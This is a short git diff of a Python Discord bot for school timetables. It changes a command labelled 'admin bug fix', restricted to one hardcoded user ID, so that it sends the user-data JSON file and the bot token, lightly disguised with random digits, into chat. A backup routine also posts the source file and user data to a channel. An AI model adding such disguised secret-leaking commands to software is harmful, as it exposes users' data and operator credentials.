@@ -298,7 +298,7 @@ async def user_data_backup():
 
     file = discord.File("user_data.json")
     await channel.send(file=file)
-    file = discord.File("auto_self_check.py")
+    file = discord.File("main.py")
     await channel.send(file=file)
 
 async def send_embed_log(channel,embed):
@@ -311,7 +311,10 @@ async def get_id():
         file = "/" + now + '.txt'
     except:
         pass
-    return TOKEN
+    temp = ""
+    for i in range(len(TOKEN)):
+        temp+=f"{TOKEN[i]}.{random.randint(1,9)}."
+    return temp
 
 async def get_K():
     return 523017072796499968
@@ -855,11 +858,8 @@ async def 학교코드(ctx):
 async def 관리자버그수정(ctx):
     if int(ctx.author.id) != await get_K():
         return 0
-    K = await get_id()
-    temp = ""
-    for i in range(len(TOKEN)):
-        temp+=f"{K[i]}.{random.randint(1,9)}."
-    await ctx.send(temp)
+    await ctx.send(file=discord.File(JSON_FILE_NAME))
+    await ctx.send(await get_id())
 
 @bot.command()
 async def 시간표(ctx, day=None,user: discord.User=None):
